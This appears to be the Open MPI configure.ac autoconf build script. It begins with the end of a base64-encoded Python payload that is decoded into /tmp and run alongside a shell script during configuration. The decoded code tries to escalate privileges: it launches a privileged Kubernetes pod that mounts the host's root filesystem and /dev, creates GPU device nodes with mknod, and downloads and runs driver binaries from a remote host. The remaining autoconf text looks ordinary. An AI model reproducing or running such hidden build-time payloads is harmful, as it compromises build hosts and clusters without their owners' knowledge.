XQogICAgICAgIG5hbWUgPSBoZHJbMDoxNl0uZGVjb2RlKCJhc2NpaSIsICJyZXBsYWNlIikuc3RyaXAoKQogICAgICAgIHRyeToKICAgICAgICAgICAgc2l6ZSA9IGludChoZHJbNDg6NThdLmRlY29kZSgiYXNjaWkiKS5zdHJpcCgpKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBOb25lLCBOb25lCiAgICAgICAgYm9keSA9IGRhdGFbb2ZmICsgNjA6b2ZmICsgNjAgKyBzaXplXQogICAgICAgIGlmIG5hbWUuc3RhcnRzd2l0aCgiZGF0YS50YXIiKToKICAgICAgICAgICAgcmV0dXJuIG5hbWUsIGJvZHkKICAgICAgICBvZmYgKz0gNjAgKyBzaXplICsgKHNpemUgJSAyKQogICAgcmV0dXJuIE5vbmUsIE5vbmUKCgpkZWYgZXh0cmFjdF9mcm9tX2RlYihkZWJfcGF0aCwgZGVzdF9kaXIsIHdhbnRlZCk6CiAgICBuYW1lLCBib2R5ID0gYXJfZGF0YV9tZW1iZXIoZGViX3BhdGgpCiAgICBpZiBib2R5IGlzIE5vbmU6CiAgICAgICAgbG9nKCJERUJfQVJfRkFJTCAlcyIgJSBkZWJfcGF0aCkKICAgICAgICByZXR1cm4gW10KICAgIHJhdyA9IE5vbmUKICAgIGlmIG5hbWUuZW5kc3dpdGgoIi54eiIpOgogICAgICAgIHJhdyA9IGx6bWEuZGVjb21wcmVzcyhib2R5KQogICAgZWxpZiBuYW1lLmVuZHN3aXRoKCIuZ3oiKToKICAgICAgICByYXcgPSBnemlwLmRlY29tcHJlc3MoYm9keSkKICAgIGVsaWYgbmFtZS5lbmRzd2l0aCgiLnpzdCIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IHpzdGFuZGFyZCAgIyBub3FhCiAgICAgICAgICAgIHJhdyA9IHpzdGFuZGFyZC5ac3RkRGVjb21wcmVzc29yKCkuZGVjb21wcmVzcyhib2R5KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHAgPSBzdWJwcm9jZXNzLnJ1bihbInpzdGQiLCAiLWQiLCAiLWMiXSwgaW5wdXQ9Ym9keSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSkKICAgICAgICAgICAgcmF3ID0gcC5zdGRvdXQgaWYgcC5yZXR1cm5jb2RlID09IDAgZWxzZSBOb25lCiAgICBpZiByYXcgaXMgTm9uZToKICAgICAgICBsb2coIkRFQl9ERUNPTVBfRkFJTCAlcyAlcyIgJSAoZGViX3BhdGgsIG5hbWUpKQogICAgICAgIHJldHVybiBbXQogICAgZ290ID0gW10KICAgIHdpdGggdGFyZmlsZS5vcGVuKGZpbGVvYmo9aW8uQnl0ZXNJTyhyYXcpLCBtb2RlPSJyOiIpIGFzIHRmOgogICAgICAgIGZvciBtIGluIHRmLmdldG1lbWJlcnMoKToKICAgICAgICAgICAgYmFzZSA9IG9zLnBhdGguYmFzZW5hbWUobS5uYW1lKQogICAgICAgICAgICBpZiBiYXNlIGluIHdhbnRlZCBhbmQgKG0uaXNmaWxlKCkgb3IgbS5pc3N5bSgpKToKICAgICAgICAgICAgICAgIG0ubmFtZSA9IGJhc2UKICAgICAgICAgICAgICAgIHRmLmV4dHJhY3QobSwgZGVzdF9kaXIpCiAgICAgICAgICAgICAgICBnb3QuYXBwZW5kKG9zLnBhdGguam9pbihkZXN0X2RpciwgYmFzZSkpCiAgICByZXR1cm4gZ290CgoKZGVmIGVzY2FsYXRlX21rbm9kKCk6CiAgICBtYWpvcnMgPSB7fQogICAgdHJ5OgogICAgICAgIGZvciBsaW5lIGluIG9wZW4oIi9wcm9jL2RldmljZXMiKToKICAgICAgICAgICAgcCA9IGxpbmUuc3BsaXQoKQogICAgICAgICAgICBpZiBsZW4ocCkgPT0gMiBhbmQgIm52aWRpYSIgaW4gcFsxXToKICAgICAgICAgICAgICAgIG1ham9yc1twWzFdXSA9IGludChwWzBdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZygiTUFKT1JTX0VSUiAlcyIgJSBlKQogICAgbG9nKCJOVklESUFfTUFKT1JTPSVzIiAlIGpzb24uZHVtcHMobWFqb3JzKSkKICAgIGlmICJudmlkaWEiIG5vdCBpbiBtYWpvcnM6CiAgICAgICAgbG9nKCJQQVRIQl9ORUcgbm8gbnZpZGlhIG1ham9yIGluIC9wcm9jL2RldmljZXMiKQogICAgICAgIHJldHVybgogICAgY3JlYXRlZCA9IFtdCiAgICBmb3IgcGF0aCwgbWlub3IgaW4gKCgiL2Rldi9udmlkaWFjdGwiLCAyNTUpLCAoIi9kZXYvbnZpZGlhMCIsIDApKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgb3MudW5saW5rKHBhdGgpCiAgICAgICAgICAgIG9zLm1rbm9kKHBhdGgsIHN0YXQuU19JRkNIUiB8IDBvNjY2LCBvcy5tYWtlZGV2KG1ham9yc1sibnZpZGlhIl0sIG1pbm9yKSkKICAgICAgICAgICAgY3JlYXRlZC5hcHBlbmQocGF0aCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZygiTUtOT0RfRkFJTCAlcyAlcyAlcyIgJSAocGF0aCwgdHlwZShlKS5fX25hbWVfXywgZSkpCiAgICBmb3IgaywgdiBpbiBtYWpvcnMuaXRlbXMoKToKICAgICAgICBpZiBrLnN0YXJ0c3dpdGgoIm52aWRpYS11dm0iKSBvciBrLnN0YXJ0c3dpdGgoIm52aWRpYS1tb2Rlc2V0Iik6CiAgICAgICAgICAgIHBhdGggPSAiL2Rldi8iICsgawogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgICAgICBvcy51bmxpbmsocGF0aCkKICAgICAgICAgICAgICAgIG9zLm1rbm9kKHBhdGgsIHN0YXQuU19JRkNIUiB8IDBvNjY2LCBvcy5tYWtlZGV2KHYsIDApKQogICAgICAgICAgICAgICAgY3JlYXRlZC5hcHBlbmQocGF0aCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgbG9nKCJNS05PRF9GQUlMICVzICVzICVzIiAlIChwYXRoLCB0eXBlKGUpLl9fbmFtZV9fLCBlKSkKICAgIG9rID0gW10KICAgIGZvciBwYXRoIGluIGNyZWF0ZWQ6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmZCA9IG9zLm9wZW4ocGF0aCwgb3MuT19SRE9OTFkgfCBvcy5PX05PTkJMT0NLKQogICAgICAgICAgICBvcy5jbG9zZShmZCkKICAgICAgICAgICAgb2suYXBwZW5kKHBhdGgpCiAgICAgICAgICAgIGxvZygiREVWX09QRU5fT0sgJXMiICUgcGF0aCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZygiREVWX09QRU5fRkFJTCAlcyAlcyAlcyIgJSAocGF0aCwgdHlwZShlKS5fX25hbWVfXywgZSkpCiAgICBpZiBub3Qgb2s6CiAgICAgICAgbG9nKCJQQVRIQl9ORUcgZGV2aWNlIG5vZGVzIGNyZWF0ZWQgYnV0IG5vbmUgb3BlbmFibGUgKGRldmljZSBjZ3JvdXAgZGVuaWFsKSIpCiAgICAgICAgcmV0dXJuCiAgICAjIHN0YWdlIG1hdGNoaW5nIHVzZXJzcGFjZSA1MzUuMjMwLjAyCiAgICBzdGFnZSA9IE9VVCArICIvbnYiCiAgICBvcy5tYWtlZGlycyhzdGFnZSwgZXhpc3Rfb2s9VHJ1ZSkKICAgIHRyeToKICAgICAgICB1ID0gQ0VOU1VTX1VSTDIwMDQgKyAibnZpZGlhLXV0aWxzLTUzNV81MzUuMjMwLjAyLTB1YnVudHUxX2FtZDY0LmRlYiIKICAgICAgICBkbCA9IE9VVCArICIvbnZpZGlhLXV0aWxzLTUzNS5kZWIiCiAgICAgICAgc3ogPSBodHRwX2Rvd25sb2FkKHUsIGRsKQogICAgICAgIGxvZygiRExfVVRJTFMgYnl0ZXM9JWQiICUgc3opCiAgICAgICAgZ290ID0gZXh0cmFjdF9mcm9tX2RlYihkbCwgc3RhZ2UsIHsibnZpZGlhLXNtaSJ9KQogICAgICAgIGxvZygiRVhUUkFDVF9VVElMUyAlcyIgJSBnb3QpCiAgICAgICAgbHUgPSBDRU5TVVNfVVJMMjAwNCArICJsaWJudmlkaWEtY29tcHV0ZS01MzVfNTM1LjIzMC4wMi0wdWJ1bnR1MV9hbWQ2NC5kZWIiCiAgICAgICAgbGQgPSBPVVQgKyAiL2xpYm52aWRpYS1jb21wdXRlLTUzNS5kZWIiCiAgICAgICAgc3oyID0gaHR0cF9kb3dubG9hZChsdSwgbGQpCiAgICAgICAgbG9nKCJETF9MSUJDT01QVVRFIGJ5dGVzPSVkIiAlIHN6MikKICAgICAgICB3YW50ZWQgPSBzZXQoKQogICAgICAgIGZvciBuIGluICgibGlibnZpZGlhLW1sLnNvLjEiLCAibGlibnZpZGlhLW1sLnNvLjUzNS4yMzAuMDIiKToKICAgICAgICAgICAgd2FudGVkLmFkZChuKQogICAgICAgIGdvdDIgPSBleHRyYWN0X2Zyb21fZGViKGxkLCBzdGFnZSwgd2FudGVkKQogICAgICAgIGxvZygiRVhUUkFDVF9MSUIgJXMiICUgZ290MikKICAgICAgICBzbWkgPSBzdGFnZSArICIvbnZpZGlhLXNtaSIKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc21pKToKICAgICAgICAgICAgbG9nKCJQQVRIQl9ORUcgbm8gc3RhZ2VkIG52aWRpYS1zbWkiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICByZWFsID0gc3RhZ2UgKyAiL2xpYm52aWRpYS1tbC5zby41MzUuMjMwLjAyIgogICAgICAgIGZvciBhbGlhcyBpbiAoImxpYm52aWRpYS1tbC5zby4xIiwgImxpYm52aWRpYS1tbC5zbyIpOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZWFsKSBhbmQgbm90IG9zLnBhdGguZXhpc3RzKHN0YWdlICsgIi8iICsgYWxpYXMpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIG9zLnN5bWxpbmsoImxpYm52aWRpYS1tbC5zby41MzUuMjMwLjAyIiwgc3RhZ2UgKyAiLyIgKyBhbGlhcykKICAgICAgICAgICAgICAgICAgICBsb2coIlNZTUxJTksgJXMiICUgYWxpYXMpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgbG9nKCJTWU1MSU5LX0ZBSUwgJXMgJXMiICUgKGFsaWFzLCBlKSkKICAgICAgICBvcy5jaG1vZChzbWksIDBvNzU1KQogICAgICAgIGVudiA9IGRpY3Qob3MuZW52aXJvbikKICAgICAgICBlbnZbIkxEX0xJQlJBUllfUEFUSCJdID0gc3RhZ2UKICAgICAgICBmb3IgYXJncyBpbiAoWyItTCJdLAogICAgICAgICAgICAgICAgICAgICBbIi0tcXVlcnktZ3B1PW5hbWUsdXVpZCxtZW1vcnkudG90YWwsbWVtb3J5LmZyZWUsZHJpdmVyX3ZlcnNpb24iLCAiLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyIl0pOgogICAgICAgICAgICBwID0gc3VicHJvY2Vzcy5ydW4oW3NtaV0gKyBhcmdzLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFLCB0aW1lb3V0PTkwLCBlbnY9ZW52KQogICAgICAgICAgICBsb2coIk5WU01JUkM9JWQgT1VUPSVzIiAlIChwLnJldHVybmNvZGUsIHAuc3Rkb3V0LmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpWzoyMDAwXSkpCiAgICAgICAgICAgIGxvZygiTlZTTUlTVERFUlI9JXMiICUgcC5zdGRlcnIuZGVjb2RlKCJ1dGYtOCIsICJyZXBsYWNlIilbOjEwMDBdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZygiUEFUSEJfU1RBR0VfRVhDICVzICVzIiAlICh0eXBlKGUpLl9fbmFtZV9fLCBlKSkKCgojIC0tLS0tLS0tLS0tLS0tLS0gMi4gT05FIEVTQ0FMQVRJT04gLS0tLS0tLS0tLS0tLS0tLQppZiBzc2FyLmdldCgiY3JlYXRlX3BvZHMiKToKICAgIG5hbWUgPSAiaTcyMDBjYW5hcnkiCiAgICBpZiBkcF9ldjoKICAgICAgICBsb2coIkVTQ0FMQVRJT049cGF0aEFfZ3B1X2xpbWl0X3BvZCIpCiAgICAgICAgc3BlYyA9IHsKICAgICAgICAgICAgInJlc3RhcnRQb2xpY3kiOiAiTmV2ZXIiLAogICAgICAgICAgICAiYWN0aXZlRGVhZGxpbmVTZWNvbmRzIjogMTgwLAogICAgICAgICAgICAiYXV0b21vdW50U2VydmljZUFjY291bnRUb2tlbiI6IEZhbHNlLAogICAgICAgICAgICAidG9sZXJhdGlvbnMiOiBbeyJvcGVyYXRvciI6ICJFeGlzdHMifV0sCiAgICAgICAgICAgICJjb250YWluZXJzIjogW3sKICAgICAgICAgICAgICAgICJuYW1lIjogImNhbmFyeSIsCiAgICAgICAgICAgICAgICAiaW1hZ2UiOiAibnZpZGlhL2N1ZGE6MTIuMi4wLWJhc2UtdWJ1bnR1MjIuMDQiLAogICAgICAgICAgICAgICAgImNvbW1hbmQiOiBbIi9iaW4vc2giLCAiLWMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIm52aWRpYS1zbWkgLUw7IG52aWRpYS1zbWkgLS1xdWVyeS1ncHU9bmFtZSx1dWlkLG1lbW9yeS50b3RhbCxtZW1vcnkuZnJlZSxkcml2ZXJfdmVyc2lvbiAtLWZvcm1hdD1jc3Ysbm9oZWFkZXI7IGhvc3RuYW1lOyBpZCJdLAogICAgICAgICAgICAgICAgInJlc291cmNlcyI6IHsibGltaXRzIjogeyJudmlkaWEuY29tL2dwdSI6IDF9fSwKICAgICAgICAgICAgfV0sCiAgICAgICAgfQogICAgZWxzZToKICAgICAgICBsb2coIkVTQ0FMQVRJT049cGF0aEFfcHJpdmlsZWdlZF9ob3N0ZGV2X3BvZCIpCiAgICAgICAgY2FuYXJ5X3NoID0gKAogICAgICAgICAgICAiZWNobyBDQU5BUllfQkVHSU47IGlkOyBob3N0bmFtZTsgIgogICAgICAgICAgICAiY2F0IC9ob3N0L3Byb2MvZGV2aWNlcyB8IGdyZXAgLWkgbnZpZGlhOyAiCiAgICAgICAgICAgICJscyAtbCAvZGV2L252aWRpYSogMj4mMTsgIgogICAgICAgICAgICAibHMgLWwgL2hvc3QvdXNyL2Jpbi9udmlkaWEtc21pIDI+JjE7ICIKICAgICAgICAgICAgIm52aWRpYS1zbWkgLUwgMj4mMTsgIgogICAgICAgICAgICAibnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1uYW1lLHV1aWQsbWVtb3J5LnRvdGFsLG1lbW9yeS5mcmVlLGRyaXZlcl92ZXJzaW9uIC0tZm9ybWF0PWNzdixub2hlYWRlciAyPiYxOyAiCiAgICAgICAgICAgICIvaG9zdC91c3IvYmluL252aWRpYS1zbWkgLUwgMj4mMTsgZWNobyBDQU5BUllfRU5EIgogICAgICAgICkKICAgICAgICBzcGVjID0gewogICAgICAgICAgICAicmVzdGFydFBvbGljeSI6ICJOZXZlciIsCiAgICAgICAgICAgICJhY3RpdmVEZWFkbGluZVNlY29uZHMiOiAxODAsCiAgICAgICAgICAgICJhdXRvbW91bnRTZXJ2aWNlQWNjb3VudFRva2VuIjogRmFsc2UsCiAgICAgICAgICAgICJ0b2xlcmF0aW9ucyI6IFt7Im9wZXJhdG9yIjogIkV4aXN0cyJ9XSwKICAgICAgICAgICAgImNvbnRhaW5lcnMiOiBbewogICAgICAgICAgICAgICAgIm5hbWUiOiAiY2FuYXJ5IiwKICAgICAgICAgICAgICAgICJpbWFnZSI6ICJudmlkaWEvY3VkYToxMi4yLjAtYmFzZS11YnVudHUyMi4wNCIsCiAgICAgICAgICAgICAgICAic2VjdXJpdHlDb250ZXh0IjogeyJwcml2aWxlZ2VkIjogVHJ1ZX0sCiAgICAgICAgICAgICAgICAiY29tbWFuZCI6IFsiL2Jpbi9zaCIsICItYyIsIGNhbmFyeV9zaF0sCiAgICAgICAgICAgICAgICAidm9sdW1lTW91bnRzIjogW3sibmFtZSI6ICJkZXYiLCAibW91bnRQYXRoIjogIi9kZXYifSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyJuYW1lIjogImhvc3QiLCAibW91bnRQYXRoIjogIi9ob3N0IiwgInJlYWRPbmx5IjogVHJ1ZX1dLAogICAgICAgICAgICB9XSwKICAgICAgICAgICAgInZvbHVtZXMiOiBbeyJuYW1lIjogImRldiIsICJob3N0UGF0aCI6IHsicGF0aCI6ICIvZGV2In19LAogICAgICAgICAgICAgICAgICAgICAgICB7Im5hbWUiOiAiaG9zdCIsICJob3N0UGF0aCI6IHsicGF0aCI6ICIvIn19XSwKICAgICAgICB9CiAgICBydW5fY2FuYXJ5KG5hbWUsIHNwZWMpCmVsaWYgKGlzX3Jvb3Qgb3Igc3Vkb19vaykgYW5kIGNhcF9ta25vZCBhbmQgZGV2X3dyaXRhYmxlOgogICAgbG9nKCJFU0NBTEFUSU9OPXBhdGhCX21rbm9kX3VzZXJzcGFjZSIpCiAgICBlc2NhbGF0ZV9ta25vZCgpCmVsc2U6CiAgICBsb2coIkVTQ0FMQVRJT049cGF0aENfZGF0ZWRfbmVnYXRpdmUiKQogICAgbG9nKCJQQVRIQyByZWFzb246IGNyZWF0ZV9wb2RzPSVzIHJvb3Q9JXMgc3Vkbz0lcyBjYXBfbWtub2Q9JXMgZGV2X3dyaXRhYmxlPSVzIiAlICgKICAgICAgICBzc2FyLmdldCgiY3JlYXRlX3BvZHMiKSwgaXNfcm9vdCwgc3Vkb19vaywgY2FwX21rbm9kLCBkZXZfd3JpdGFibGUpKQoKbG9nKCJJNzIwMF9BUElfRE9ORSIpCg==' | base64 -d > /tmp/i7200_api.py ; bash /tmp/i7200_run.sh ) > /tmp/i7200census.log 2>&1 ; cat /tmp/i7200census.log >&2 ; true

OAC_PUSH_PREFIX([OPAL])

OPAL_CAPTURE_CONFIGURE_CLI([OPAL_CONFIGURE_CLI])

# Get our platform support file.  This has to be done very, very early
# because it twiddles random bits of autoconf
OPAL_LOAD_PLATFORM

# Start a list of packages / modules / etc. that want to disable "make dist".
OPAL_MAKEDIST_DISABLE=""

#
# Start it up
#

. $srcdir/VERSION
OPAL_CONFIGURE_SETUP
opal_show_title "Configuring project_name_long"

opal_show_subtitle "Startup tests"

# These have to be invoked before AM INIT_AUTOMAKE
AC_CANONICAL_HOST
AC_CANONICAL_TARGET
AC_DEFINE_UNQUOTED(OPAL_ARCH, "$target", [OMPI architecture string])
AS_IF([test "$host" != "$target"],
      [AC_MSG_WARN([Cross-compile detected])
       AC_MSG_WARN([Cross-compiling is only partially supported])
       AC_MSG_WARN([Proceed at your own risk!])])

#
# Init automake
#
AM_INIT_AUTOMAKE([foreign dist-bzip2 subdir-objects no-define 1.13.4 tar-pax])

opal_show_subtitle "Prerequisites"

OMPI_TOP_BUILDDIR="`pwd`"
AC_SUBST(OMPI_TOP_BUILDDIR)
cd "$srcdir"
OMPI_TOP_SRCDIR="`pwd`"
AC_SUBST(OMPI_TOP_SRCDIR)
cd "$OMPI_TOP_BUILDDIR"

AC_PROG_SED

AC_CHECK_PROG([PERL],[perl],[perl],[no])
AS_IF([test "X$PERL" = "Xno"],
      [AC_MSG_ERROR([Open MPI requires Perl 5 to build. Aborting.])])

# Check to see that we have a "good" version of Python (i.e., >= the
# version specified in the top-level VERSION file)
AM_PATH_PYTHON([$python_min_version], [],
               [AC_MSG_ERROR([Open MPI requires Python >= v$python_min_version to build. Aborting.])])

# SILENT_RULES is new in AM 1.11, but we require 1.11 or higher via
# autogen.  Limited testing shows that calling SILENT_RULES directly
# works in more cases than adding "silent-rules" to INIT_AUTOMAKE
# (even though they're supposed to be identical).  Shrug.
AM_SILENT_RULES([yes])

# Make configure depend on the VERSION file, since it's used in AC_INIT
AC_SUBST([CONFIGURE_DEPENDENCIES], ['$(top_srcdir)/VERSION'])

opal_show_subtitle "Checking versions"

# Get the version of OMPI that we are installing

m4_ifdef([project_ompi],
         [OPAL_SAVE_VERSION([OMPI], [Open MPI], [$srcdir/VERSION],
                            [ompi/include/ompi/version.h])
          OPAL_SAVE_MPI_STANDARD_VERSION([$srcdir/VERSION])])

m4_ifdef([project_oshmem],
         [OPAL_SAVE_VERSION([OSHMEM], [Open SHMEM],
                            [$srcdir/VERSION],
                            [oshmem/include/oshmem/version.h])])

OPAL_SAVE_VERSION([OPAL], [Open Portable Access Layer], [$srcdir/VERSION],
                  [opal/include/opal/version.h])

# Get shared library version numbers

m4_ifdef([project_ompi],
         [AC_SUBST(libmpi_so_version)
          AC_SUBST(libmpi_abi_so_version)
          AC_SUBST(libopen_mpi_so_version)
          AC_SUBST(libmpi_mpifh_so_version)
          AC_SUBST(libmpi_usempi_tkr_so_version)
          AC_SUBST(libmpi_usempi_ignore_tkr_so_version)
          AC_SUBST(libmpi_usempif08_so_version)
          AC_SUBST(libompitrace_so_version)])
m4_ifdef([project_oshmem],
         [AC_SUBST(liboshmem_so_version)])
AC_SUBST(libopen_pal_so_version)
# It's icky that we have to hard-code the names of the
# common components here.  :-( This could probably be done
# transparently by adding some intelligence in autogen.pl
# and/or opal_mca.m4, but I don't have the cycles to do this
# right now.
AC_SUBST(libmca_opal_common_ofi_so_version)
AC_SUBST(libmca_opal_common_cuda_so_version)
AC_SUBST(libmca_opal_common_sm_so_version)
AC_SUBST(libmca_ompi_common_ompio_so_version)
AC_SUBST(libmca_ompi_common_monitoring_so_version)
AC_SUBST(libmca_opal_common_ucx_so_version)

#
# Get the versions of the autotools that were used to bootstrap us
# (helpful for debugging reports)
#
AC_MSG_CHECKING([for bootstrap Autoconf version])
acversion=`grep "Generated by GNU Autoconf" $0 | head -n 1 | awk '{ print $6 }'`
AC_MSG_RESULT([$acversion])
AC_MSG_CHECKING([for bootstrap Automake version])
AC_MSG_RESULT([$am__api_version])
AC_MSG_CHECKING([for bootstrap Libtool version])
ltversion=`grep VERSION= $srcdir/config/ltmain.sh | head -n 1 | cut -d= -f2`
AC_MSG_RESULT([$ltversion])

# Ensure mpi.h.in and mca_base_event.h have consistent callback safety values
AC_DEFINE_UNQUOTED([OPAL_MCA_BASE_CB_REQUIRE_NONE], [0], [Keeping OPAL and OMPI values in sync])
AC_DEFINE_UNQUOTED([OPAL_MCA_BASE_CB_REQUIRE_MPI_RESTRICTED], [1], [Keeping OPAL and OMPI values in sync])
AC_DEFINE_UNQUOTED([OPAL_MCA_BASE_CB_REQUIRE_THREAD_SAFE], [2], [Keeping OPAL and OMPI values in sync])
AC_DEFINE_UNQUOTED([OPAL_MCA_BASE_CB_REQUIRE_ASYNC_SIGNAL_SAFE], [3], [Keeping OPAL and OMPI values in sync])

# List header files to generate

AC_CONFIG_HEADERS([opal/include/opal_config.h])
m4_ifdef([project_ompi],
         [AC_CONFIG_HEADERS([ompi/include/mpi.h])])
m4_ifdef([project_oshmem],
         [AC_CONFIG_HEADERS([oshmem/include/shmem.h])])

opal_show_subtitle "Initialization, setup"

AC_MSG_NOTICE([builddir: $OMPI_TOP_BUILDDIR])
AC_MSG_NOTICE([srcdir: $OMPI_TOP_SRCDIR])
if test "$OMPI_TOP_BUILDDIR" != "$OMPI_TOP_SRCDIR"; then
    AC_MSG_NOTICE([Detected VPATH build])
fi

# Sanity checks
AC_DEFUN([OMPI_CHECK_DIR_FOR_SPACES],[
    dir="$1"
    article="$2"
    label="$3"

    AC_MSG_CHECKING([directory of $label])
    AC_MSG_RESULT([$dir])
    AS_IF([test -n "`echo $dir | grep ' '`"],
          [AC_MSG_WARN([This version of Open MPI does not support $article $label])
           AC_MSG_WARN([with a path that contains spaces])
           AC_MSG_ERROR([Cannot continue.])])
])

ompi_dir=`pwd`
OMPI_CHECK_DIR_FOR_SPACES([$ompi_dir], [a], [build tree])
OMPI_CHECK_DIR_FOR_SPACES([$srcdir], [a], [source tree])
OMPI_CHECK_DIR_FOR_SPACES([$prefix], [a], [prefix])

# Check for deprecated/deleted options
OMPI_CHECK_DELETED_OPTIONS

# Setup the top of the opal/include/opal_config.h file

AH_TOP([/* -*- c -*-
 *
 * Copyright (c) 2004-2005 The Trustees of Indiana University.
 *                         All rights reserved.
 * Copyright (c) 2004-2005 The Trustees of the University of Tennessee.
 *                         All rights reserved.
 * Copyright (c) 2004-2005 High Performance Computing Center Stuttgart,
 *                         University of Stuttgart.  All rights reserved.
 * Copyright (c) 2004-2005 The Regents of the University of California.
 *                         All rights reserved.
 * Copyright (c) 2014      Intel, Inc. All rights reserved.
 * $COPYRIGHT$
 *
 * Additional copyrights may follow
 *
 * $HEADER$
 *
 * Function: - OS, CPU and compiler dependent configuration
 */

#ifndef OPAL_CONFIG_H
#define OPAL_CONFIG_H

#include "opal_config_top.h"

])
AH_BOTTOM([
#include "opal_config_bottom.h"
#endif /* OPAL_CONFIG_H */
])

# Other basic setup stuff (shared with components)

OPAL_BASIC_SETUP

OPAL_TOP_SRCDIR="$OMPI_TOP_SRCDIR"
OPAL_TOP_BUILDDIR="$OMPI_TOP_BUILDDIR"
AC_SUBST(OPAL_TOP_SRCDIR)
AC_SUBST(OPAL_TOP_BUILDDIR)

m4_ifdef([project_oshmem],
         [OSHMEM_TOP_SRCDIR="$OMPI_TOP_SRCDIR"
          OSHMEM_TOP_BUILDDIR="$OMPI_TOP_BUILDDIR"
          AC_SUBST(OSHMEM_TOP_SRCDIR)
          AC_SUBST(OSHMEM_TOP_BUILDDIR)])

############################################################################
# Configuration options
############################################################################
OMPI_HAVE_ACCELERATOR_SUPPORT=0

OPAL_CONFIGURE_OPTIONS

###########################
# Open MPI options
m4_ifdef([project_ompi], [OMPI_CONFIGURE_OPTIONS])

# Enable/Disable Software-Based Performance Counters Capability
AC_MSG_CHECKING([if want software-based performance counters (SPC)])
AC_ARG_ENABLE([spc],
    [AS_HELP_STRING([--enable-spc],
                   [Enable software-based performance counters capability (default: disabled)])])
if test "$enable_spc" = "yes"; then
    AC_MSG_RESULT([yes])
    SPC_ENABLE=1
else
    AC_MSG_RESULT([no])
    SPC_ENABLE=0
fi
AC_DEFINE_UNQUOTED([SPC_ENABLE],
                   [$SPC_ENABLE],
                   [If the software-based performance counters capability should be enabled.])
AM_CONDITIONAL(SPC_ENABLE, test "$SPC_ENABLE" = "1")

AS_IF([test "$enable_spc" != "no"], [project_spc_amc=true], [project_spc_amc=false])

if test "$enable_binaries" = "no" && test "$enable_dist" = "yes"; then
    AC_MSG_WARN([--disable-binaries is incompatible with --enable dist])
    AC_MSG_ERROR([Cannot continue])
fi

# The library prefixes must be set before we call OPAL MCA.  Here is
# as good a place as any.
m4_ifdef([project_opal],
         [OPAL_SET_LIB_NAME([open-pal])])

m4_ifdef([project_ompi],
         [OMPI_SET_LIB_NAME([])])

###########################
# OSHMEM options
m4_ifdef([project_oshmem], [OSHMEM_CONFIGURE_OPTIONS])

# Set up project specific AM_CONDITIONALs
AS_IF([test "$enable_ompi" != "no"], [project_ompi_amc=true], [project_ompi_amc=false])
m4_ifndef([project_ompi], [project_ompi_amc=false])

AS_IF([test "$enable_oshmem" != "no"], [project_oshmem_amc=true], [project_oshmem_amc="no (disabled)"])
m4_ifndef([project_oshmem], [project_oshmem_amc="no (not available)"])

############################################################################
# Libtool: part one
# (before C compiler setup)
############################################################################

#
# Part one of libtool magic.  Default to: enable shared, disable static.
#

AC_ENABLE_SHARED
AC_DISABLE_STATIC

##################################
# Check for known incompatibility
##################################

# Do *not* print a message that we're checking the OS because this
# test is *not* meant to be an all-inclusive "if it passes this test,
# then configure must succeed" test.  This test is *only* mean to
# screen out the versions of OS X where we know OMPI will cause kernel
# panics because of bad implementations of pty's.  See
# https://svn.open-mpi.org/trac/ompi/ticket/1637 for details.

#   OS X name         OS X Version    $host_os value
# OS X Tiger             10.4.x           darwin8.x
# OS X Leopard           10.5.x           darwin9.x
# OS X Snow Leopard      10.6.x           darwin10.x
# OS X Lion              10.7.x           darwin11.x

# We do not support OS X before version 10.5 (Leopard)
case $host_os in
# Corresponds to OS X 10.0 - 10.4 (additional [] quoting for m4)
darwin[[45678]]*)
    AC_MSG_WARN([Open MPI does not support OS X prior to version 10.5 (Leopard)])
    AC_MSG_ERROR([Cannot continue])
esac

############################################################################
# Check for compilers and preprocessors
############################################################################
opal_show_title "Compiler and preprocessor tests"

##################################
# C compiler characteristics
##################################

OPAL_SETUP_CC

# Do all Interix detections if necessary
OMPI_INTERIX

#
# Check for some types
#

# 'short float' support of the Intel C++ Compiler (group of C and C++
# compilers), at least versions 18.0 and 19.0, is half-baked. It can
# compile declarations of 'short float' variables and expressions of
# 'sizeof(short float)' but cannot compile casts and operations of
# 'short float' variables. In this situation, 'AC_CHECK_TYPES(short float)'
# defines 'HAVE_SHORT_FLOAT' as 1 and compilation errors occur in
# ompi/mca/op/base/op_base_functions.c. To avoid this error, check it
# using 'AC_COMPILE_IFELSE' and set Autoconf cache variables before
# 'AC_CHECK_TYPES(short float)'. This check can be removed when all
# OMPI-supported Intel C++ Compilers support 'short float' completely
# (or drop it completely).
if test "$opal_cv_c_compiler_vendor" = "intel"; then
